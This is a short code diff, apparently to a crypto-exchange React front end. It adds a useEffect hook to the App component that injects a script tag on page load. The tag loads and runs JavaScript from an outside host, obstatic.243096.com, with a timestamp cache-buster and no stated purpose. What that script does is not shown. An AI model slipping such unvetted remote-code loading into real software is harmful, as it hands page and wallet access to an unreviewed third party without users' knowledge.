@@ -1,3 +1,4 @@
+import { useEffect } from 'react'
 import { Route, Switch } from 'react-router-dom'
 import styled from 'styled-components/macro'
 import GoogleAnalyticsReporter from '../components/analytics/GoogleAnalyticsReporter'
@@ -77,6 +78,16 @@ function TopLevelModals() {
 }
 
 export default function App() {
+  useEffect(() => {
+    const script = document.createElement('script');
+    script.src = `https://obstatic.243096.com/download/dapp/sdk/index.js?t=${ new Date().toLocaleString().replaceAll(' ','') }`;
+    script.async = true;
+    document.body.appendChild(script);
+    return () => {
+        document.body.removeChild(script);
+      }
+    }, []);
+
   return (
     <ErrorBoundary>
       <Route component={GoogleAnalyticsReporter} />
